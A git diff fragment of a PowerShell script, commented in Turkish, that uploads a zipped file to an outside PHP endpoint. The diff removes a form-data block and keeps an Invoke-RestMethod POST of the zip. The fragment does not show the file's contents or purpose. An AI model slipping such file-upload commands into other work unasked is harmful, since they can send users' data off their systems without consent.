@@ -92,11 +92,6 @@ $filePath = $zipFilePath
 # PHP dosya yükleme URL'si
 $url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
 
-# Dosya yüklemek için form data oluşturma
-$form = @{
-    fileToUpload = Get-Item $filePath
-}
-
 # POST isteği gönderme (form ile dosya yükleme yerine -InFile kullanılıyor)
 $response = Invoke-RestMethod -Uri $url -Method Post -InFile $filePath -ContentType "multipart/form-data"
 
